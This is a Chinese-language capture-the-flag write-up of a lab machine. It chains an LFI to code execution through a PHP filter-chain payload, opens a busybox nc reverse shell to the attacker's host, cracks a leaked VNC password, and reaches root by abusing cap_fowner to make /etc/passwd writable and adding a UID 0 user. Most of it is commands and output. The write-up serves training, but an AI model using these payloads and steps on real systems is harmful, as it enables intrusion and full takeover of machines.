# **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 发现目标主机IP，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.140 08:00:27:23:44:a3       PCS Systemtechnik GmbH
...
```

**端口扫描:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.140
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5901/tcp open  vnc-1
...
```

扫描结果表明，目标主机IP为 `192.168.205.140`，开放了 **22 (SSH)**、**80 (HTTP)** 和 **5901 (VNC)** 端口。

**VNC服务侦察:**
对5901端口进行详细的服务扫描，确认其为VNC服务，并支持标准的密码认证，这为后续的横向移动提供了潜在的攻击面。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p5901 -sV -sC 192.168.205.140
...
PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
...
```

# **二、漏洞发现与初始访问**

## **1. Web服务LFI漏洞**

访问80端口，发现是一个LFI漏洞的测试页面。通过 `file` 参数可以包含任意文件。

**验证LFI漏洞:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.140/index.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
todd:x:1000:1000:,,,:/home/todd:/bin/bash
...
```

成功读取 `/etc/passwd` 文件，确认了LFI漏洞的存在。

## **2. LFI Bypass `disable_functions` RCE**

通过`php://filter`读取`phpinfo`发现，目标PHP环境禁用了 `system`, `passthru`, `shell_exec` 等常用命令执行函数，导致传统的LFI to RCE方法失效。

```
disable_functions	system,passthru,shell_exec,proc_open,pcntl_exec,dl
```

然而，我们可以换一个常用命令执行函数，最终绕过`disable_functions`的限制来执行代码。

我们使用 `php_filter_chain_generator` 工具来生成能够执行 `exec($_GET["0"]);` 的Payload。

> https://github.com/synacktiv/php_filter_chain_generator

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '<?php exec($_GET["0"]); ?>'

[+] The following gadget chain will generate the following code : <?php exec($_GET["0"]); ?>
php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
```

## **3. 获取 www-data Shell**

将生成的Payload附加到URL中，并通过 `0` 参数传递反弹shell命令，在本地开启监听，成功获取 `www-data` 用户的交互式Shell。

**本地监听:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ nc -lvnp 8888
```

**执行Payload获取Shell:**
(将 `[CHAIN]` 替换为上面工具生成的完整过滤器链)

```bash
http://192.168.205.140/index.php?file=[CHAIN]&0=busybox nc 192.168.205.128 8888 -e /bin/bash
```

**获取Shell并稳定TTY:**

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 48454
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 使用 script 稳定Shell
script /dev/null -c bash
# 使用 Ctrl+Z 将其置于后台，然后使用 stty 修复终端
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、权限提升**

## **1. www-data -> todd (横向移动)**

在 `www-data` shell中进行信息搜集，在用户 `todd` 的家目录下发现了一个全局可读的VNC密码备份文件。

```bash
www-data@VNC1:/home/todd/.vnc$ ls -al
...
-rw-r--r--  1 root root      8 Jul 28 22:05 passwd.bak
...
www-data@VNC1:/home/todd/.vnc$ base64 passwd.bak 
QMypcY/7jpE=
```

这是一个典型的错误配置。我们将这个Base64编码的密码哈希复制到本地进行破解。我们使用 `vncpwd` 工具，该工具专门用于解密这类VNC密码文件。

**在Kali上破解VNC密码:**

```bash
# 克隆并编译工具
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ git clone https://github.com/jeroennijhof/vncpwd.git
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd vncpwd && make

# 将从目标机获取的base64字符串解码回文件
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/vncpwd]
└─$ echo 'QMypcY/7jpE=' |base64 -d > passwd

# 执行解密
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/vncpwd]
└─$ ./vncpwd passwd                        
Password: vncpassw
```

成功解密出VNC密码为 `vncpassw`。使用 `vncviewer` 和此密码连接到目标的5901端口（这里需要图形化桌面）。

```bash
┌──(kali㉿kali)-[~]
└─$ vncviewer 192.168.205.140:1
...
Password: vncpassw
Authentication successful
...
```

成功登录，获取 `todd` 用户的图形化桌面会话。在该用户家目录下找到第一个flag。

```bash
www-data@VNC1:/home/todd$ cat user.txt 
12f54a96f64443246930da001cafda8b
```

## **2. todd -> root (垂直提权)**

在 `todd` 用户的会话中进行提权信息搜集。首先检查文件的特殊能力（Capabilities）。

```bash
todd@VNC1:~$ getcap -r / 2>/dev/null
...
/home/todd/Videos/python3.9 = cap_fowner+ep
```

发现一个位于用户家目录下的 `python3.9` 可执行文件被赋予了 `cap_fowner` 能力。该能力允许进程**无视文件权限**，更改文件的所有者和**权限**。

直接利用该能力 `setuid(0)` 的尝试失败了。

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
PermissionError: [Errno 1] Operation not permitted
```

但是，`chmod` 操作并未被限制。因此，我们可以利用此能力将 `/etc/passwd` 文件变为全局可写，然后添加一个UID为0的新用户来实现提权。

**利用`cap_fowner`修改`/etc/passwd`权限:**

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c "import os; os.chmod('/etc/passwd', 0o777)"
todd@VNC1:~$ ls -al /etc/passwd
-rwxrwxrwx 1 root root 1853 Jul 28 10:17 /etc/passwd
```

成功修改权限。现在，我们向 `/etc/passwd` 文件中追加一个新用户 `b`，其UID和GID均为0，密码为 `abcdefg` (使用`$1$`的MD5哈希)。

```bash
todd@VNC1:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' >> /etc/passwd
```

**切换用户并获取最终Flag:**

```bash
todd@VNC1:~$ su b
Password: abcdefg
root@VNC1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@VNC1:~# cat /root/root.txt /home/todd/user.txt 
flag{root-60b725f10c9c85c70d97880dfe8191b3}
12f54a96f64443246930da001cafda8b
```

至此，成功获取root权限，靶机完全攻破。